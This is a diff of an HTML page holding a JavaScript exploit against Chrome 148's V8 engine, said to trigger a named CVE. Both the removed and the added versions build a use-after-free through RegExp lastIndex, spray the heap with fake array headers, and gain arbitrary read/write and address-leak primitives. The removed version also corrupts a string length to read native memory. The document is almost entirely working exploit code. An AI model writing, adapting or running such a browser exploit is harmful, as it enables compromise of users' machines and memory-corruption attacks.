@@ -1,165 +1,127 @@
 <!doctype html>
-<html><head><meta charset="utf-8"><title>P4</title></head>
+<html><head><meta charset="utf-8"><title>Probe4</title></head>
 <body><pre id="out">Running...</pre>
 <script>
 "use strict";
 const O=document.getElementById("out");
 function log(s){O.textContent+="\n"+s;}
-const cvt=new ArrayBuffer(8);const f64=new Float64Array(cvt);
-const u64=new BigUint64Array(cvt);const u32=new Uint32Array(cvt);
+
+const cvt=new ArrayBuffer(8);
+const f64=new Float64Array(cvt);
+const u64=new BigUint64Array(cvt);
+const u32=new Uint32Array(cvt);
 function i2f(i){u64[0]=BigInt.asUintN(64,BigInt(i));return f64[0];}
 function f2i(f){f64[0]=f;return u64[0];}
 function w2f(lo,hi){u32[0]=lo>>>0;u32[1]=hi>>>0;return f64[0];}
+function f2w(f){f64[0]=f;return[u32[0]>>>0,u32[1]>>>0];}
+function hex(n){return"0x"+(n>>>0).toString(16);}
+
 function trash(n){for(let i=0;i<n;i++)new Array(0x400).fill(1.1);}
 
-const DMAP=0x1032a5d,OMAP=0x1032ae5,EMPTY=0x7e5;
-const PIN=0x1100011,MAXS=0x7fdffffe;
+// Chrome 148.0.7778.167 constants (verified stable across 6 runs)
+const DMAP=0x1032a5d;   // PackedDoubleElements JSArray map
+const OMAP=0x1032ae5;   // PackedElements JSArray map
+const EMPTY=0x7e5;      // EmptyFixedArray (static root)
 
+// Pre-allocate large arrays -> LO space for stable PINNED addresses
+// 0x8000 doubles = 256KB -> definitely in LO space at ~0x1200011
 const pinnedDoubles=new Array(0x8000);
 for(let i=0;i<pinnedDoubles.length;i++)pinnedDoubles[i]=10.125+i*0.001;
 const pinnedObjects=new Array(0x8000);
 for(let i=0;i<pinnedObjects.length;i++)pinnedObjects[i]=null;
+
+// Wasm instance
+const wasmBytes=new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,1,127,3,2,1,0,7,5,1,1,102,0,0,10,6,1,4,0,65,42,11]);
+const wasmInst=new WebAssembly.Instance(new WebAssembly.Module(wasmBytes));
+
+// Victim arrays
 const victim=[1.22,1.33,1.44];
-const wasmI=new WebAssembly.Instance(new WebAssembly.Module(
-  new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,1,127,3,2,1,0,7,5,1,1,102,0,0,10,6,1,4,0,65,42,11])));
-const dec=new TextDecoder("windows-1252");
-const eb=new Uint8Array(64);eb.fill(0x41);
-const extStr=dec.decode(eb);
 
-const re=/(?:)/;
-const fk={flags:"g",lastIndex:1073741823,constructor:{[Symbol.species]:function(){return re;}}};
-const c0=w2f(DMAP,EMPTY),c1=w2f(PIN,MAXS);
-const sk=[];
-function spray(){for(let i=0;i<24;i++){const a=new Array(i&1?0x3ffb:0x3fff).fill(c0);for(let j=1;j<a.length;j+=2)a[j]=c1;sk.push(a);}}
+// JSArray header for spray: [DMAP|EMPTY|elements|length]
+// elements = EMPTY (EmptyFixedArray) for safety
+// length = 0 (Smi) - will be overwritten via /proc after materialization
+const PINNED_DBL=0x1200011; // LO-space FDA address (stable on Chrome 148)
+const MAX_SMI=0x7fdffffe;   // Max stable Smi length
 
-log("UA: "+navigator.userAgent);
-trash(230);trash(230);
-RegExp.prototype[Symbol.matchAll].call(fk,"").next();
-log("TRIG:"+re.lastIndex);
-trash(230);trash(230);
-spray();spray();spray();
+// Spray pattern cycle: header + body
+const cycle0=w2f(DMAP,EMPTY);          // map + properties
+const cycle1=w2f(PINNED_DBL,MAX_SMI);  // elements + length
 
-let hdrS=-1,hdrJ=-1,master=null,sa=null;
-try{
-master=re.lastIndex;
-log("T:"+typeof master+" A:"+Array.isArray(master));
-if(!Array.isArray(master))throw new Error("NO_MAT");
-log("L:"+master.length);
+const sprayKeep=[];
 
-// M2a: find hosting spray array via unique length tag
-for(let s=0;s<sk.length;s++){
-  const a2=sk[s];const U=0x1002+s*2;
-  for(let j=1;j<a2.length;j+=2)a2[j]=w2f(PIN,U);
-  if(master.length===(U>>>1)){hdrS=s;break;}
-  for(let j=1;j<a2.length;j+=2)a2[j]=c1;
-}
-if(hdrS<0)throw new Error("M2A_MISS");
-log("M2A:"+hdrS);
-sa=sk[hdrS];
-// M2b: find exact slot
-for(let j=1;j<sa.length;j+=2){
-  const keep=sa[j];
-  sa[j]=w2f(PIN,0x2002);
-  if(master.length===0x1001){hdrJ=j;break;}
-  sa[j]=keep;
-}
-if(hdrJ<0)throw new Error("M2B_MISS");
-log("M2B:"+hdrJ);
-sa[hdrJ]=c1;
-
-// M3: redirect primitives
-function rdEq(addr,pat){
-  sa[hdrJ]=w2f(((addr-8)|1)>>>0,MAXS);
-  const r=(master[0]===pat);
-  sa[hdrJ]=c1;
-  return r;
-}
-function rdVal(addr){
-  sa[hdrJ]=w2f(((addr-8)|1)>>>0,MAXS);
-  const v=f2i(master[0]);
-  sa[hdrJ]=c1;
-  return v;
-}
-function wr64d(addr,dbl){
-  sa[hdrJ]=w2f(((addr-8)|1)>>>0,MAXS);
-  master[0]=dbl;
-  sa[hdrJ]=c1;
-}
-const PAT_NONE=i2f(0xdeadbeefdeadbeefn);
-for(let w=0;w<30000;w++){rdEq(0x1100018,PAT_NONE);}
-log("M3:WARM");
-
-// M4: locate our LO objects
-const D0=i2f(0x4024000000000000n);
-const FDAPAT=i2f((0x10000n<<32n)|0x939n);
-const FAPAT=i2f((0x10000n<<32n)|0x5ddn);
-let fda=-1,fa=-1;
-for(let k=0;k<96;k++){
-  const A=0x1000000+k*0x40000+0x10;
-  if(fda<0&&rdEq(A,FDAPAT)&&rdEq(A+8,D0)&&rdEq(A+16,pinnedDoubles[1])){fda=A;}
-  if(fa<0&&rdEq(A,FAPAT)){fa=A;}
-  if(fda>=0&&fa>=0)break;
-}
-log("M4:FDA="+(fda>=0?fda.toString(16):"X")+" FA="+(fa>=0?fa.toString(16):"X"));
-
-// M5: addrof via master self map-flip
-let addrofFn=null;
-if(fda>=0){
-  const holdEl=w2f((fda|1)>>>0,MAXS);
-  const mD=w2f(DMAP,EMPTY),mO=w2f(OMAP,EMPTY);
-  addrofFn=function(obj){
-    sa[hdrJ]=holdEl;
-    sa[hdrJ-1]=mO;
-    master[0]=obj;
-    sa[hdrJ-1]=mD;
-    sa[hdrJ]=c1;
-    const raw=rdVal(fda+8);
-    pinnedDoubles[0]=10.125;
-    return raw&0xffffffffn;
-  };
-  const testA=addrofFn(wasmI);
-  const testB=addrofFn(extStr);
-  log("M5:WASM@"+testA.toString(16)+" EXT@"+testB.toString(16));
-  if(testA>0x1000n&&testA<0x8000000n)log("M5:ADDROF_OK");
-}
-
-// M6: external string length corruption + native dump
-if(addrofFn){
-  const ES=addrofFn(extStr);
-  const q8=rdVal(Number(ES)+8);
-  const handle=q8>>32n;
-  const corrupted=i2f((handle<<32n)|0x1200000n);
-  wr64d(Number(ES)+8,corrupted);
-  log("M6:LEN="+extStr.length);
-  if(extStr.length===0x1200000){
-    log("M6:NATIVE_OOB_OK");
-    const offs=[0,0x30,0x100,0x1000,0x8000,0x10000,0x40000,0x100000];
-    for(const off of offs){
-      let lo=0,hi=0;
-      for(let i=0;i<8;i++){
-        const c=extStr.charCodeAt(off+i);
-        if(i<4)lo+=c*(2**(8*i));else hi+=c*(2**(8*(i-4)));
-      }
-      log("N+"+off.toString(16)+":"+(hi>>>0).toString(16).padStart(8,"0")+(lo>>>0).toString(16).padStart(8,"0"));
-    }
-    // scan a 64KB window for image-looking pointers (hi in 0x1..0x7fff)
-    let ptrs=0;
-    for(let off=0;off<0x10000;off+=8){
-      let lo=0,hi=0;
-      for(let i=0;i<8;i++){
-        const c=extStr.charCodeAt(off+i);
-        if(i<4)lo+=c*(2**(8*i));else hi+=c*(2**(8*(i-4)));
-      }
-      if(hi>0&&hi<0x8000&&(lo>>>0)>0x1000){ptrs++;}
-    }
-    log("M6:PTRS64K="+ptrs);
-    wr64d(Number(ES)+8,i2f(q8)); // restore
-    log("M6:RESTORED len="+extStr.length);
+function sprayFakeArrays(){
+  for(let i=0;i<24;i++){
+    const arr=new Array(i&1?0x3ffb:0x3fff).fill(cycle0);
+    for(let j=1;j<arr.length;j+=2)arr[j]=cycle1;
+    sprayKeep.push(arr);
   }
 }
-log("W:"+wasmI.exports.f());
-log("=== DONE ===");
-}catch(e){log("E:"+e.message);}
-if(typeof master!=="undefined"&&hdrJ>=0){try{sa[hdrJ]=c1;sa[hdrJ-1]=c0;}catch(e2){}}
+
+// Setup
+const re=/(?:)/;
+const pseudoRe={
+  flags:"g",
+  lastIndex:1073741823,
+  constructor:{[Symbol.species]:function(){return re;}}
+};
+
+log("UA: "+navigator.userAgent);
+log("JSPI: "+(typeof WebAssembly.Suspending)+"/"+
+    (typeof WebAssembly.promising));
+
+// Phase 1: Promote to old gen (fill semi-space to force promotions)
+trash(230);trash(230);
+
+// Phase 2: Trigger CVE-2026-15776
+RegExp.prototype[Symbol.matchAll].call(pseudoRe,"").next();
+log("TRIGGER: lastIndex="+re.lastIndex);
+
+// Phase 3: Scavenge to free stale HeapNumber (missing write barrier)
+trash(230);trash(230);
+
+// Phase 4: Spray to reclaim freed memory with fake JSArray header
+sprayFakeArrays();
+sprayFakeArrays();
+sprayFakeArrays();
+
+// Phase 4: Read re.lastIndex
+try{
+  const master=re.lastIndex;
+  const mt=typeof master;
+  log("TYPE: "+mt+" isArray="+Array.isArray(master));
+
+  if(Array.isArray(master)){
+    log("LENGTH: "+master.length);
+    // master.elements = PINNED_DBL -> reads from pinnedDoubles backing store
+    try{
+      log("m[0]: "+master[0]);
+      log("m[1]: "+master[1]);
+    }catch(e){log("READ_ERR: "+e.message);}
+
+    // addrof via pinned object array
+    pinnedObjects[0]=wasmInst;
+    // master can read pinnedObjects via the offset from PINNED_DBL to PINNED_OBJ
+    const objOff=(0x10c0011-0x1200011)/8;
+    if(objOff>0&&objOff<master.length){
+      const raw=f2i(master[objOff]);
+      log("WASM_ADDR: "+raw.toString(16));
+    }
+
+    log("WASM_RESULT: "+wasmInst.exports.f());
+    log("CAGE_RW_ACHIEVED");
+  }else if(mt==="object"){
+    log("OBJ_NOT_ARRAY");
+    try{log("KEYS: "+Object.keys(master).length);}catch(e){}
+  }else if(mt==="number"){
+    const[lo,hi]=f2w(master);
+    log("NUM: lo="+hex(lo)+" hi="+hex(hi));
+    if(lo===0x1032a5d||hi===0x1032a5d){
+      log("SPRAY_HIT_AS_NUMBER");
+    }
+  }
+}catch(e){
+  log("DEREF_ERR: "+e.message);
+}
+
 log("=== DONE ===");
 </script></body></html>
